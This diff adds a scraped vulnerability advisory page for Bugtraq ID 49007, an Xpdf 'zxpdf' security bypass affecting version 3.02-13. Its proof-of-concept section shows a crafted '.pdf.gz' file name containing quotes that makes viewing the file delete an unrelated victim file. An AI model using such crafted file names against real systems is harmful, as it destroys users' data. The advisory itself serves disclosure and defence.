@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid49007<p><b><span style="font-size: 18pt;">Xpdf 'zxpdf' Security Bypass Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/49007/info">info</a><br><a href="http://www.securityfocus.com/bid/49007/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/49007/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/49007/solution">solution</a><br><a href="http://www.securityfocus.com/bid/49007/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				49007
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 04 2011 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 04 2011 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Chung-chieh Shan
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Xpdf Xpdf  3.02-13<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Xpdf Xpdf  3.02-19<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof-of-concept code is available:<br/><br/>$ touch y                                         # The unrelated victim file<br/>$ gzip -c &amp;lt;/dev/null &amp;gt;'" y ".pdf.gz'         # Create a .pdf.gz file<br/>$ xpdf '" y ".pdf.gz'                             # View it using xpdf<br/>Error: May not be a PDF file (continuing anyway)<br/>Error: PDF file is damaged - attempting to reconstruct xref table...<br/>Error: Couldn't find trailer dictionary<br/>Error: Couldn't read xref table<br/>rm: cannot remove `/tmp/': Is a directory<br/>$ ls -l y                                            # The victim file is gone!<br/>ls: cannot access y: No such file or directory
+	
+		<ul>
+</ul>
+</div>
